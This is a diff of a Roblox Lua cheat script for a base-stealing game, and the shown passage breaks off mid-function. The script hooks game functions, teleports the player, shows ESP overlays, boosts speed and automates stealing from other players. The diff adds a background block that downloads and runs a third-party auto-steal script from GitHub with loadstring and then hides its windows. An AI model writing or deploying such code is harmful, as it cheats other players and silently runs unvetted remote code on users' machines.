@@ -10,10 +10,8 @@ local lp=Players.LocalPlayer; local cam=workspace.CurrentCamera
 
 local CFG="AethonSuite.json"
 local Cfg={
-    triggerChance=91,flashOn=false,grabOn=true,potionOn=false,
-    stealSpdOn=false,stealSpdVal=30,
-    pos_LP={ox=6,oy=48},pos_FP={ox=0,oy=5},
-    pos_AP={ox=0,oy=0},pos_BP={ox=0,oy=0},pos_SP={ox=6,oy=0},
+    triggerChance=91,flashOn=false,potionOn=false,stealSpdOn=false,stealSpdVal=30,
+    pos_LP={ox=4,oy=48},pos_FP={ox=0,oy=5},pos_AP={ox=0,oy=0},pos_BP={ox=0,oy=0},pos_SP={ox=4,oy=0},
 }
 pcall(function()
     if not readfile then return end
@@ -30,16 +28,20 @@ local SG=Instance.new("ScreenGui"); SG.Name="AS_"..tostring(math.random(1000,999
 SG.ResetOnSpawn=false; SG.ZIndexBehavior=Enum.ZIndexBehavior.Global; SG.IgnoreGuiInset=true; SG.Parent=CoreGui
 
 local T={
-    bg=Color3.fromRGB(5,5,8),panel=Color3.fromRGB(8,8,13),surf=Color3.fromRGB(14,14,22),surf2=Color3.fromRGB(20,20,30),
-    a1=Color3.fromRGB(225,225,238),a2=Color3.fromRGB(175,175,195),white=Color3.new(1,1,1),
-    dim=Color3.fromRGB(100,100,122),str=Color3.fromRGB(155,155,178),red=Color3.fromRGB(255,65,65),grn=Color3.fromRGB(52,218,88),
-    acc=Color3.fromRGB(130,100,255),
+    bg=Color3.fromRGB(5,5,8),panel=Color3.fromRGB(8,8,14),surf=Color3.fromRGB(14,14,24),surf2=Color3.fromRGB(20,20,32),
+    a1=Color3.fromRGB(220,220,240),a2=Color3.fromRGB(170,170,200),white=Color3.new(1,1,1),
+    dim=Color3.fromRGB(95,95,120),str=Color3.fromRGB(150,150,180),red=Color3.fromRGB(255,65,65),grn=Color3.fromRGB(52,218,88),
+    acc=Color3.fromRGB(130,100,255),blu=Color3.fromRGB(80,140,255),org=Color3.fromRGB(255,160,50),
 }
 local function co(p,r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 6); c.Parent=p end
 local function ms(p,th,col,tr) local s=Instance.new("UIStroke"); s.Thickness=th or 1; s.Color=col or T.str; s.Transparency=tr or 0.38; s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; s.Parent=p; return s end
 local function lb(par,props) local l=Instance.new("TextLabel"); l.BackgroundTransparency=1; l.Font=Enum.Font.GothamBold; l.TextColor3=T.white; l.BorderSizePixel=0; for k,v in pairs(props) do l[k]=v end; l.Parent=par; return l end
 local function btn(par,text,sz,pos,bg) local b=Instance.new("TextButton"); b.Size=sz; b.Position=pos; b.BackgroundColor3=bg or T.surf; b.BackgroundTransparency=0.22; b.Text=text; b.TextColor3=T.white; b.Font=Enum.Font.GothamBold; b.TextSize=9; b.BorderSizePixel=0; b.AutoButtonColor=false; b.Parent=par; co(b,4); ms(b,1,T.str,0.44); return b end
-local function rotS(f,col) local s=ms(f,1.3,col,0.22); local g=Instance.new("UIGradient",s); g.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),ColorSequenceKeypoint.new(0.25,Color3.new(0,0,0)),ColorSequenceKeypoint.new(0.5,col),ColorSequenceKeypoint.new(0.75,Color3.new(0,0,0)),ColorSequenceKeypoint.new(1,Color3.new(1,1,1))}; task.spawn(function() while s and s.Parent do g.Rotation=(g.Rotation+0.9)%360; task.wait(0.016) end end) end
+local function rotS(f,col)
+    local s=ms(f,1.4,col,0.18); local g=Instance.new("UIGradient",s)
+    g.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),ColorSequenceKeypoint.new(0.25,Color3.new(0,0,0)),ColorSequenceKeypoint.new(0.5,col),ColorSequenceKeypoint.new(0.75,Color3.new(0,0,0)),ColorSequenceKeypoint.new(1,Color3.new(1,1,1))}
+    task.spawn(function() while s and s.Parent do g.Rotation=(g.Rotation+1)%360; task.wait(0.018) end end)
+end
 local function dragSave(h,f,key)
     local on,ds,sp=false,nil,nil
     h.InputBegan:Connect(function(i)
@@ -59,14 +61,21 @@ local function dragSave(h,f,key)
         end
     end)
 end
+
+-- Unique panel builder with colored accent
 local function mkP(defX,defY,w,h,title,ac,posKey)
     local px=(posKey and Cfg[posKey] and Cfg[posKey].ox) or defX
     local py=(posKey and Cfg[posKey] and Cfg[posKey].oy) or defY
     local f=Instance.new("Frame"); f.Size=UDim2.fromOffset(w,h); f.Position=UDim2.fromOffset(px,py)
-    f.BackgroundColor3=T.panel; f.BackgroundTransparency=0.28; f.BorderSizePixel=0; f.ClipsDescendants=true; f.Parent=SG; co(f,8); rotS(f,ac or T.a1)
-    local hdr=Instance.new("Frame"); hdr.Size=UDim2.new(1,0,0,19); hdr.BackgroundColor3=T.surf; hdr.BackgroundTransparency=0.18; hdr.BorderSizePixel=0; hdr.Parent=f; co(hdr,8)
-    local flat=Instance.new("Frame"); flat.Size=UDim2.new(1,0,0,6); flat.Position=UDim2.new(0,0,1,-6); flat.BackgroundColor3=T.surf; flat.BackgroundTransparency=0.18; flat.BorderSizePixel=0; flat.Parent=hdr
-    if title then lb(hdr,{Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-22,1,0),Text=title,TextSize=7,Font=Enum.Font.GothamBlack,TextXAlignment=Enum.TextXAlignment.Left,TextColor3=T.a1}) end
+    f.BackgroundColor3=T.panel; f.BackgroundTransparency=0.25; f.BorderSizePixel=0; f.ClipsDescendants=true; f.Parent=SG; co(f,8)
+    rotS(f,ac or T.a1)
+    -- Colored left accent bar
+    local bar=Instance.new("Frame",f); bar.Size=UDim2.fromOffset(2,h); bar.BackgroundColor3=ac or T.a1; bar.BackgroundTransparency=0.3; bar.BorderSizePixel=0; co(bar,1)
+    local hdr=Instance.new("Frame"); hdr.Size=UDim2.new(1,0,0,19); hdr.BackgroundColor3=T.surf; hdr.BackgroundTransparency=0.15; hdr.BorderSizePixel=0; hdr.Parent=f; co(hdr,8)
+    local flat=Instance.new("Frame"); flat.Size=UDim2.new(1,0,0,6); flat.Position=UDim2.new(0,0,1,-6); flat.BackgroundColor3=T.surf; flat.BackgroundTransparency=0.15; flat.BorderSizePixel=0; flat.Parent=hdr
+    -- Accent dot in header
+    local dot=Instance.new("Frame",hdr); dot.Size=UDim2.fromOffset(4,4); dot.Position=UDim2.new(0,7,0.5,-2); dot.BackgroundColor3=ac or T.a1; dot.BackgroundTransparency=0.1; dot.BorderSizePixel=0; co(dot,4)
+    if title then lb(hdr,{Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,-30,1,0),Text=title,TextSize=7,Font=Enum.Font.GothamBlack,TextXAlignment=Enum.TextXAlignment.Left,TextColor3=T.a1}) end
     local mb=btn(hdr,"─",UDim2.fromOffset(13,11),UDim2.new(1,-16,0.5,-5.5),T.surf2); mb.TextSize=7; mb.TextColor3=T.dim; mb.BackgroundTransparency=0.6
     dragSave(hdr,f,posKey); return f,hdr,mb
 end
@@ -81,10 +90,10 @@ local function mkF(parent,hH,cH,mb)
     return content
 end
 local function pillR(parent,label,yPos,onCol)
-    local row=Instance.new("Frame"); row.Size=UDim2.new(1,-6,0,18); row.Position=UDim2.new(0,3,0,yPos)
+    local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,18); row.Position=UDim2.new(0,4,0,yPos)
     row.BackgroundColor3=T.surf; row.BackgroundTransparency=0.28; row.BorderSizePixel=0; row.Parent=parent; co(row,5)
     local rs=ms(row,1,T.str,0.55)
-    local rl=lb(row,{Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-34,1,0),Text=label,TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
+    local rl=lb(row,{Position=UDim2.new(0,7,0,0),Size=UDim2.new(1,-36,1,0),Text=label,TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
     local track=Instance.new("Frame"); track.Size=UDim2.fromOffset(22,10); track.Position=UDim2.new(1,-25,0.5,-5); track.BackgroundColor3=T.surf2; track.BorderSizePixel=0; track.Parent=row; co(track,10)
     local knob=Instance.new("Frame"); knob.Size=UDim2.fromOffset(7,7); knob.Position=UDim2.new(0,2,0.5,-3.5); knob.BackgroundColor3=T.a2; knob.BorderSizePixel=0; knob.Parent=track; co(knob,7)
     local pb=Instance.new("TextButton"); pb.Size=UDim2.new(1,0,1,0); pb.BackgroundTransparency=1; pb.Text=""; pb.Parent=row
@@ -92,7 +101,7 @@ local function pillR(parent,label,yPos,onCol)
     local function set(v)
         TweenService:Create(track,TweenInfo.new(0.12),{BackgroundColor3=v and col or T.surf2}):Play()
         TweenService:Create(knob,TweenInfo.new(0.12),{Position=v and UDim2.new(1,-9,0.5,-3.5) or UDim2.new(0,2,0.5,-3.5),BackgroundColor3=v and T.white or T.a2}):Play()
-        TweenService:Create(rs,TweenInfo.new(0.12),{Color=v and col or T.str,Transparency=v and 0.18 or 0.55}):Play()
+        TweenService:Create(rs,TweenInfo.new(0.12),{Color=v and col or T.str,Transparency=v and 0.15 or 0.55}):Play()
         rl.TextColor3=v and T.white or T.dim
     end
     return pb,set
@@ -113,8 +122,8 @@ end
 
 task.wait(0.1); local vp=cam.ViewportSize; if vp.X==0 then vp=Vector2.new(390,844) end
 
--- Smaller panels
-local LP_W=118; local LP_CH=100; local LP_H=19+LP_CH+9
+-- Panel sizes
+local LP_W=118; local LP_CH=74; local LP_H=19+LP_CH+9
 local FP_W=138; local FP_CH=116; local FP_H=19+FP_CH+9
 local AP_W=176; local AP_Y_DEF=5+FP_H+4
 local BP_W=124; local BP_CH=4*21+4; local BP_H=19+BP_CH+9
@@ -125,7 +134,7 @@ if not Cfg.pos_AP or Cfg.pos_AP.ox==0 then Cfg.pos_AP={ox=math.floor(vp.X-AP_W-4
 if not Cfg.pos_BP or Cfg.pos_BP.ox==0 then Cfg.pos_BP={ox=math.floor(vp.X*0.5-BP_W*0.5),oy=math.floor(vp.Y*0.5-BP_H*0.5)} end
 if not Cfg.pos_SP or Cfg.pos_SP.oy==0 then Cfg.pos_SP={ox=4,oy=LP_H+48+4} end
 
--- Anti-lag always in background (silent)
+-- Anti-lag always in background
 pcall(function()
     Lighting.GlobalShadows=false; Lighting.FogEnd=1e9
     for _,v in pairs(workspace:GetDescendants()) do
@@ -133,8 +142,31 @@ pcall(function()
     end
 end)
 workspace.DescendantAdded:Connect(function(v)
+    pcall(function() if v:IsA("ParticleEmitter") or v:IsA("PointLight") then v.Enabled=false end end)
+end)
+
+-- =====================================================================
+-- IRISH HUB AUTO STEAL (background, GUI hidden automatically)
+-- =====================================================================
+task.spawn(function()
+    task.wait(2.5)
+    local preGuis={}
     pcall(function()
-        if v:IsA("ParticleEmitter") or v:IsA("PointLight") then v.Enabled=false end
+        for _,v in ipairs(CoreGui:GetChildren()) do preGuis[v]=true end
+        for _,v in ipairs(lp.PlayerGui:GetChildren()) do preGuis[v]=true end
+    end)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/irishhub-scriptzzz/Irish-Hub-Auto-Steal/refs/heads/main/Irish%20Hub%20Auto%20Steal.lua"))()
+    end)
+    task.wait(1)
+    -- Hide any new GUIs the loadstring created
+    pcall(function()
+        for _,v in ipairs(CoreGui:GetChildren()) do
+            if not preGuis[v] and v:IsA("ScreenGui") and v~=SG then v.Enabled=false end
+        end
+        for _,v in ipairs(lp.PlayerGui:GetChildren()) do
+            if not preGuis[v] and v:IsA("ScreenGui") then v.Enabled=false end
+        end
     end)
 end)
 
@@ -156,7 +188,6 @@ task.spawn(function() while task.wait(0.7) do
     fpsLb.TextColor3=fps<40 and T.red or fps<55 and Color3.fromRGB(255,190,40) or T.grn
 end end)
 
--- Reset Panels + floating buttons
 local rsPnlBtn=Instance.new("TextButton",SG); rsPnlBtn.Size=UDim2.fromOffset(84,12)
 rsPnlBtn.Position=UDim2.new(0.5,-42,0,48); rsPnlBtn.BackgroundColor3=T.panel; rsPnlBtn.BackgroundTransparency=0.42
 rsPnlBtn.Text="Reset Panels"; rsPnlBtn.Font=Enum.Font.GothamBold; rsPnlBtn.TextSize=7; rsPnlBtn.TextColor3=T.dim
@@ -255,15 +286,15 @@ local function addMineESP(child)
     local bb=Instance.new("BillboardGui"); bb.Size=UDim2.fromOffset(96,28); bb.StudsOffset=Vector3.new(0,5,0); bb.AlwaysOnTop=true; bb.Adornee=part; bb.Parent=workspace
     local bg=Instance.new("Frame",bb); bg.Size=UDim2.new(1,0,1,0); bg.BackgroundColor3=Color3.fromRGB(14,2,2); bg.BackgroundTransparency=0.05; bg.BorderSizePixel=0; co(bg,6)
     local stroke=Instance.new("UIStroke",bg); stroke.Color=Color3.fromRGB(255,40,40); stroke.Thickness=1.5
-    local bar=Instance.new("Frame",bg); bar.Size=UDim2.fromOffset(3,28); bar.BackgroundColor3=Color3.fromRGB(255,50,50); bar.BorderSizePixel=0; co(bar,2)
+    local bar2=Instance.new("Frame",bg); bar2.Size=UDim2.fromOffset(3,28); bar2.BackgroundColor3=Color3.fromRGB(255,50,50); bar2.BorderSizePixel=0; co(bar2,2)
     lb(bg,{Size=UDim2.fromOffset(14,28),Position=UDim2.fromOffset(5,0),BackgroundTransparency=1,Text="⚠",Font=Enum.Font.GothamBlack,TextSize=10,TextColor3=Color3.fromRGB(255,80,80)})
     lb(bg,{Size=UDim2.new(1,-22,0,15),Position=UDim2.fromOffset(20,1),BackgroundTransparency=1,Text="SUBSPACE MINE",Font=Enum.Font.GothamBlack,TextSize=8,TextColor3=Color3.fromRGB(255,90,90),TextXAlignment=Enum.TextXAlignment.Left,TextStrokeTransparency=0.4,TextStrokeColor3=Color3.new(0,0,0)})
     local distL=lb(bg,{Size=UDim2.new(1,-22,0,11),Position=UDim2.fromOffset(20,14),BackgroundTransparency=1,Text="-- studs",Font=Enum.Font.Gotham,TextSize=7,TextColor3=Color3.fromRGB(180,80,80),TextXAlignment=Enum.TextXAlignment.Left})
     task.spawn(function()
         while bb.Parent do
-            TweenService:Create(stroke,TweenInfo.new(0.55,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.72}):Play(); TweenService:Create(bar,TweenInfo.new(0.55),{BackgroundTransparency=0.5}):Play()
+            TweenService:Create(stroke,TweenInfo.new(0.55,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.72}):Play(); TweenService:Create(bar2,TweenInfo.new(0.55),{BackgroundTransparency=0.5}):Play()
             task.wait(0.55); if not bb.Parent then break end
-            TweenService:Create(stroke,TweenInfo.new(0.55,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0}):Play(); TweenService:Create(bar,TweenInfo.new(0.55),{BackgroundTransparency=0}):Play()
+            TweenService:Create(stroke,TweenInfo.new(0.55,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0}):Play(); TweenService:Create(bar2,TweenInfo.new(0.55),{BackgroundTransparency=0}):Play()
             task.wait(0.55)
         end
     end)
@@ -277,9 +308,7 @@ local function addMineESP(child)
         end
     end)
     mineESPs[child]={bb=bb,dc=dc}
-    child.AncestryChanged:Connect(function()
-        if not child.Parent then pcall(function() bb:Destroy() end); pcall(function() dc:Disconnect() end); mineESPs[child]=nil end
-    end)
+    child.AncestryChanged:Connect(function() if not child.Parent then pcall(function() bb:Destroy() end); pcall(function() dc:Disconnect() end); mineESPs[child]=nil end end)
 end
 for _,d in pairs(workspace:GetDescendants()) do addMineESP(d) end
 workspace.DescendantAdded:Connect(function(d) task.defer(function() addMineESP(d) end) end)
@@ -357,7 +386,11 @@ prBtn.MouseButton1Click:Connect(function()
     end)
 end)
 
--- BASE PROTECTOR (full working version with RE listeners)
+-- =====================================================================
+-- BASE PROTECTOR
+-- FIX: hookfunction only triggers when steal is on OWN base, not when
+-- WE steal from others (was causing self-triggering)
+-- =====================================================================
 local CARPET={["Flying Carpet"]=true,["Witch's Broom"]=true,["Santa's Sleigh"]=true,["Cupid's Wings"]=true}
 local antiSteal=false; local autoKick=false; local antiIntruder=false; local antiTp=false
 local lastPunish={}; local carpetSpam={}; local plrPos={}; local tpCD={}
@@ -411,6 +444,15 @@ local function findThief()
     end
     return nil
 end
+local function isPromptOnMyBase(prompt)
+    if not myPlotRef then return false end
+    local ancestor=prompt.Parent
+    while ancestor and ancestor~=workspace do
+        if ancestor==myPlotRef then return true end
+        ancestor=ancestor.Parent
+    end
+    return false
+end
 local function chkHitbox()
     if not stealHitbox then return end
     local cf,sz=stealHitbox.CFrame,stealHitbox.Size; local hx,hz=sz.X*0.5,sz.Z*0.5
@@ -422,17 +464,19 @@ local function chkHitbox()
         end
     end end
 end
+-- FIXED: only trigger when steal prompt is on OUR base
 pcall(function()
     if not hookfunction or not fireproximityprompt then return end
     local old=fireproximityprompt
     hookfunction(fireproximityprompt,newcclosure(function(prompt,...)
         if antiSteal and (prompt.ActionText or ""):lower():find("steal") then
-            local thief=findThief(); if thief then punish(thief) end; chkHitbox()
+            if isPromptOnMyBase(prompt) then
+                local thief=findThief(); if thief then punish(thief) end; chkHitbox()
+            end
         end
         return old(prompt,...)
     end))
 end)
--- RE/StealService fast detection (from DEX)
 task.spawn(function()
     pcall(function()
         local net=RS:WaitForChild("Packages"):WaitForChild("Net",8); if not net then return end
@@ -481,7 +525,7 @@ local function activatePotion()
     end) end)
 end
 
--- Carpet equip (Tokinu reset)
+-- Tokinu instant reset
 local CARPET_KW={"carpet","tapis","flying","witch","broom","sleigh","cupid","wing"}
 local function equipCarpetTool()
     local char=lp.Character; if not char then return false end
@@ -496,11 +540,10 @@ local function equipCarpetTool()
     if not found then for _,t in ipairs(char:GetChildren()) do if not found then chk(t) end end end
     if found then
         if found.Parent~=char then found.Parent=char end
-        hum:EquipTool(found); return true
+        local hum2=char:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:EquipTool(found) end; return true
     end
     return false
 end
-
 local function doReset()
     local c=lp.Character; if not c then return end
     local h=c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso"); if not h then return end
@@ -523,89 +566,88 @@ local function equipFlash()
 end
 
 -- =====================================================================
--- AUTO ALLIGN - 27 podium positions with cam aligns
--- Equips carpet → TPs to nearest podium → aligns cam → equips Flash
+-- AUTO ALLIGN - 27 podiums with floor detection
+-- Floor 1: Y < 5 → pods 1-10
+-- Floor 2: 5 ≤ Y < 22 → pods 11-18
+-- Floor 3: Y ≥ 22 → pods 19-27
+-- After TP: aligns cam (restores to Custom so player can move it), equips Flash
 -- =====================================================================
 local PodiumPoints={
-    -- Floor 1 A Side
+    -- Floor 1 A Side (1-5)
     {pos=Vector3.new(-330.3,-4.9,94.6), camCF=CFrame.lookAt(Vector3.new(-324.852,3.376,103.738),Vector3.new(-325.155,2.826,102.959))},
     {pos=Vector3.new(-323.4,-4.9,94.0), camCF=CFrame.lookAt(Vector3.new(-316.695,3.492,102.060),Vector3.new(-317.111,2.933,101.343))},
     {pos=Vector3.new(-315.9,-4.9,94.2), camCF=CFrame.lookAt(Vector3.new(-310.255,3.690,102.906),Vector3.new(-310.581,3.115,102.156))},
     {pos=Vector3.new(-309.7,-4.9,94.2), camCF=CFrame.lookAt(Vector3.new(-302.102,3.311,101.665),Vector3.new(-302.596,2.766,100.988))},
     {pos=Vector3.new(-296.8,-5.4,93.7), camCF=CFrame.lookAt(Vector3.new(-292.982,-1.861,94.294),Vector3.new(-293.677,-2.389,93.806))},
-    -- Floor 1 B Side
+    -- Floor 1 B Side (6-10)
     {pos=Vector3.new(-300.4,-5.2,129.8), camCF=CFrame.lookAt(Vector3.new(-304.365,-0.257,136.083),Vector3.new(-303.880,-0.681,135.318))},
     {pos=Vector3.new(-306.6,-5.4,128.0), camCF=CFrame.lookAt(Vector3.new(-315.538,0.977,135.225),Vector3.new(-314.824,0.579,134.649))},
     {pos=Vector3.new(-317.0,-5.1,134.5), camCF=CFrame.lookAt(Vector3.new(-312.718,-0.547,132.938),Vector3.new(-313.495,-1.113,133.215))},
     {pos=Vector3.new(-324.1,-4.9,131.7), camCF=CFrame.lookAt(Vector3.new(-320.155,0.308,136.046),Vector3.new(-320.722,-0.235,135.426))},
     {pos=Vector3.new(-336.7,-5.4,130.5), camCF=CFrame.lookAt(Vector3.new(-334.110,-2.056,136.160),Vector3.new(-334.243,-2.365,135.218))},
-    -- Floor 2 A Side
+    -- Floor 2 A Side (11-15)
     {pos=Vector3.new(-329.9,13.1,93.7), camCF=CFrame.lookAt(Vector3.new(-325.140,10.148,97.954),Vector3.new(-325.575,10.727,97.264))},
     {pos=Vector3.new(-324.2,12.8,102.0), camCF=CFrame.lookAt(Vector3.new(-322.517,12.013,109.124),Vector3.new(-322.504,12.305,108.168))},
     {pos=Vector3.new(-315.9,12.8,92.8), camCF=CFrame.lookAt(Vector3.new(-308.210,20.319,93.432),Vector3.new(-308.949,19.689,93.195))},
     {pos=Vector3.new(-309.4,13.1,94.2), camCF=CFrame.lookAt(Vector3.new(-304.720,23.019,95.189),Vector3.new(-305.112,22.135,94.937))},
     {pos=Vector3.new(-299.3,12.9,93.4), camCF=CFrame.lookAt(Vector3.new(-292.952,19.006,93.712),Vector3.new(-293.701,18.397,93.450))},
-    -- Floor 2 B Side
+    -- Floor 2 B Side (16-18)
     {pos=Vector3.new(-323.5,12.6,122.7), camCF=CFrame.lookAt(Vector3.new(-314.237,20.013,131.706),Vector3.new(-314.794,19.588,130.993))},
     {pos=Vector3.new(-336.7,12.6,131.6), camCF=CFrame.lookAt(Vector3.new(-334.348,15.893,136.155),Vector3.new(-334.473,15.531,135.232))},
     {pos=Vector3.new(-316.8,12.6,122.1), camCF=CFrame.lookAt(Vector3.new(-304.595,19.357,127.057),Vector3.new(-305.398,18.978,126.596))},
-    -- Floor 3 A Side
+    -- Floor 3 A Side (19-23)
     {pos=Vector3.new(-334.2,29.6,93.5), camCF=CFrame.lookAt(Vector3.new(-336.907,26.898,98.850),Vector3.new(-336.341,27.477,98.263))},
     {pos=Vector3.new(-322.9,29.8,92.7), camCF=CFrame.lookAt(Vector3.new(-312.668,38.516,94.243),Vector3.new(-313.441,37.935,93.989))},
     {pos=Vector3.new(-312.9,30.0,93.9), camCF=CFrame.lookAt(Vector3.new(-305.856,41.590,96.372),Vector3.new(-306.347,40.779,96.055))},
     {pos=Vector3.new(-305.8,30.1,93.6), camCF=CFrame.lookAt(Vector3.new(-295.325,41.918,96.411),Vector3.new(-295.979,41.221,96.117))},
     {pos=Vector3.new(-299.9,30.1,93.5), camCF=CFrame.lookAt(Vector3.new(-296.349,34.097,93.014),Vector3.new(-297.064,33.456,92.736))},
-    -- Floor 3 B Side
+    -- Floor 3 B Side (24-27)
     {pos=Vector3.new(-335.8,29.6,131.6), camCF=CFrame.lookAt(Vector3.new(-333.401,33.240,136.147),Vector3.new(-333.535,32.820,135.249))},
     {pos=Vector3.new(-321.3,29.8,127.1), camCF=CFrame.lookAt(Vector3.new(-311.401,30.330,130.143),Vector3.new(-312.291,30.419,129.696))},
     {pos=Vector3.new(-314.6,29.8,134.6), camCF=CFrame.lookAt(Vector3.new(-309.991,30.451,131.699),Vector3.new(-310.954,30.604,131.923))},
     {pos=Vector3.new(-306.4,29.7,127.6), camCF=CFrame.lookAt(Vector3.new(-309.658,30.589,131.997),Vector3.new(-308.840,30.687,131.430))},
 }
+
 local function getNearestPodium()
     local char=lp.Character; if not char then return nil end
     local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
-    local myPos=hrp.Position; local nearest,minD=nil,math.huge
-    for _,pt in ipairs(PodiumPoints) do
+    local myPos=hrp.Position
+    -- Detect floor by Y position
+    local startIdx,endIdx
+    if myPos.Y<5 then
+        startIdx,endIdx=1,10      -- Floor 1 (Y ≈ -5)
+    elseif myPos.Y<22 then
+        startIdx,endIdx=11,18     -- Floor 2 (Y ≈ 13)
+    else
+        startIdx,endIdx=19,27     -- Floor 3 (Y ≈ 30)
+    end
+    local nearest,minD=nil,math.huge
+    for i=startIdx,endIdx do
+        local pt=PodiumPoints[i]; if not pt then continue end
         local d=(myPos-pt.pos).Magnitude; if d<minD then minD=d; nearest=pt end
     end
     return nearest
 end
+
 local function doAutoAlign()
     local nearest=getNearestPodium(); if not nearest then return end
     local char=lp.Character; if not char then return end
     local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
-    -- Equip carpet, TP
+    -- Equip carpet then TP
     equipCarpetTool(); task.wait(0.05)
     hrp.Velocity=Vector3.new(0,0,0)
     hrp.CFrame=CFrame.new(nearest.pos)
     task.wait(0.1)
-    -- Align camera
+    -- Set cam to Scriptable, align, then RESTORE to Custom so player can move camera
     cam.CameraType=Enum.CameraType.Scriptable
     cam.CFrame=nearest.camCF
+    task.wait()  -- one frame for cam to take effect
+    cam.CameraType=Enum.CameraType.Custom  -- restored: camera moveable again
     task.wait(0.05)
-    -- Equip Flash tool after TP
     equipFlash()
 end
 
--- =====================================================================
--- SWIFTY ZERO GRAVITY (always in background)
--- Applies bodyforce to counteract gravity for stable steal position
--- =====================================================================
-local function applySwiftyGrav()
-    local char=lp.Character; if not char then return end
-    local root=char:FindFirstChild("HumanoidRootPart"); if not root then return end
-    local existing=root:FindFirstChild("AethGrav"); if existing then existing:Destroy() end
-    local bf=Instance.new("BodyForce",root)
-    bf.Name="AethGrav"
-    bf.Force=Vector3.new(0,workspace.Gravity*root.AssemblyMass,0)
-end
-lp.CharacterAdded:Connect(function() task.wait(1); pcall(applySwiftyGrav) end)
-if lp.Character then pcall(applySwiftyGrav) end
-task.spawn(function() while task.wait(4) do pcall(applySwiftyGrav) end end)
-
--- =====================================================================
--- SWIFTY FLASH TP (zero gravity in background + Vander steal)
--- =====================================================================
+-- Flash TP
 local flashEnabled=Cfg.flashOn; local sliderValue=Cfg.triggerChance/100; local activePrompts={}
 
 PPS.PromptButtonHoldBegan:Connect(function(prompt)
@@ -621,7 +663,6 @@ PPS.PromptButtonHoldBegan:Connect(function(prompt)
             fired=true; conn:Disconnect(); activePrompts[prompt]=nil
             local char=lp.Character; local tool=char and char:FindFirstChildOfClass("Tool")
             if tool then pcall(function() tool:Activate() end) end
-            -- Vander steal immediately (swifty - zero grav makes position stable)
             task.spawn(function()
                 pcall(function() fireproximityprompt(prompt,10000) end)
                 pcall(function() prompt:InputHoldBegin(); task.wait(0.04); prompt:InputHoldEnd() end)
@@ -634,7 +675,7 @@ PPS.PromptButtonHoldBegan:Connect(function(prompt)
     end)
 end)
 
--- Anti-ragdoll always running
+-- Anti-ragdoll
 RunService.Heartbeat:Connect(function()
     local char=lp.Character; if not char then return end
     local hum=char:FindFirstChildOfClass("Humanoid"); local root=char:FindFirstChild("HumanoidRootPart"); if not (hum and root) then return end
@@ -741,108 +782,6 @@ local function applySpeed()
     if dir.Magnitude>0 then local spd=isStealing and stealingSpeed or normalSpeed; local vel=dir*spd; root.Velocity=Vector3.new(vel.X,root.Velocity.Y,vel.Z) end
 end
 
--- =====================================================================
--- VON SUPREME INSTANT GRAB (EXT getconnections method, faster fill)
--- PromptButtonHoldBegan → wait STEAL_DELAY → Triggered
--- Searches AnimalPodiums path specifically (von approach)
--- =====================================================================
-local grabEnabled=Cfg.grabOn
-local STEAL_DELAY=0.35  -- faster than von's 1.3s, EXT bypasses timing
-local stealInProgress=false
-
-local function fireConns(prompt,signalName)
-    local ok,conns=pcall(getconnections,prompt[signalName])
-    if not ok or type(conns)~="table" then return false end
-    local found=false
-    for _,c in ipairs(conns) do if c.Function then task.spawn(c.Function); found=true end end
-    return found
-end
-
-local function getPos2(pr)
-    local p=pr.Parent
-    if p:IsA("BasePart") then return p.Position end
-    if p:IsA("Model") then local r=p.PrimaryPart or p:FindFirstChildWhichIsA("BasePart"); return r and r.Position end
-    if p:IsA("Attachment") then return p.WorldPosition end
-    local pt=p:FindFirstChildWhichIsA("BasePart",true); return pt and pt.Position
-end
-
-local function isValidStealPrompt(pr)
-    if not pr or not pr.Parent or not pr.Enabled then return false end
-    local at=pr.ActionText; local st=pr:GetAttribute("State")
-    return at=="Steal" or at=="Grab" or at:lower():find("steal") or st=="Steal" or st=="Grab"
-end
-
-local function findNearestSteal()
-    local char=lp.Character; if not char then return nil end
-    local root=char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"); if not root then return nil end
-    local plots=workspace:FindFirstChild("Plots"); if not plots then return nil end
-    local myPos=root.Position; local nearest,nd=nil,math.huge
-    for _,plot in ipairs(plots:GetChildren()) do
-        if myPlotRef and plot==myPlotRef then continue end
-        -- Von approach: AnimalPodiums → Base → Spawn → PromptAttachment
-        local pods=plot:FindFirstChild("AnimalPodiums")
-        if pods then
-            for _,pod in ipairs(pods:GetChildren()) do
-                local base=pod:FindFirstChild("Base")
-                local spawnP=base and base:FindFirstChild("Spawn")
-                local attach=spawnP and spawnP:FindFirstChild("PromptAttachment")
-                if attach then
-                    for _,child in ipairs(attach:GetChildren()) do
-                        if child:IsA("ProximityPrompt") and isValidStealPrompt(child) then
-                            local pos=attach.WorldPosition
-                            local d=(myPos-pos).Magnitude
-                            if d<=math.max(child.MaxActivationDistance,10) and d<nd then nearest=child;nd=d end
-                        end
-                    end
-                end
-            end
-        end
-        -- General fallback
-        for _,obj in ipairs(plot:GetDescendants()) do
-            if obj:IsA("ProximityPrompt") and isValidStealPrompt(obj) then
-                local pos=getPos2(obj); if pos then
-                    local d=(myPos-pos).Magnitude
-                    if d<=math.max(obj.MaxActivationDistance,8) and d<nd then nearest=obj;nd=d end
-                end
-            end
-        end
-    end
-    return nearest
-end
-
-task.spawn(function()
-    while true do
-        if grabEnabled and not stealInProgress then
-            local char=lp.Character; local hum=char and char:FindFirstChildOfClass("Humanoid")
